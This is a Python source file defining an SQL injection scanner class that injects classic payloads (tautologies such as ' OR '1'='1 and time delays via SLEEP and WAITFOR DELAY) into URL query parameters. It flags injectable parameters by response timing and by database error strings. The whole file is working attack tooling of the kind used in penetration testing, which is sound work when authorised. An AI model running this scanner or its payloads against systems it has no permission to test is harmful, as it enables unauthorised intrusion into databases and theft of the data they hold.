import requests
import urllib.parse
import time


class SQLiEngine:
    def __init__(self, payload_file=None):
        self.payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "' AND '1'='2",
            "' OR SLEEP(5)--",
            "' WAITFOR DELAY '0:0:5'--"
        ]

        if payload_file:
            self.load_file(payload_file)

    def load_file(self, filepath):
        try:
            with open(filepath, "r") as f:
                self.payloads.extend(
                    [x.strip() for x in f if x.strip()]
                )
        except:
            pass

    def inject(self, url, param, payload):
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)

        query[param] = payload

        new_query = urllib.parse.urlencode(query, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def run(self, url, findings):
        results = []

        for f in findings:
            if f["location"] != "query":
                continue

            param = f["param"]

            for payload in self.payloads:
                target = self.inject(url, param, payload)

                start = time.time()

                try:
                    r = requests.get(target, timeout=8)
                    elapsed = round(time.time() - start, 2)
                except:
                    continue

                if elapsed >= 5:
                    results.append({
                        "url": target,
                        "param": param,
                        "payload": payload,
                        "type": "time-based SQLi"
                    })

                elif any(err in r.text.lower() for err in [
                    "sql syntax",
                    "mysql",
                    "warning:",
                    "odbc",
                    "postgresql",
                    "sqlite"
                ]):
                    results.append({
                        "url": target,
                        "param": param,
                        "payload": payload,
                        "type": "error-based SQLi"
                    })

        return results
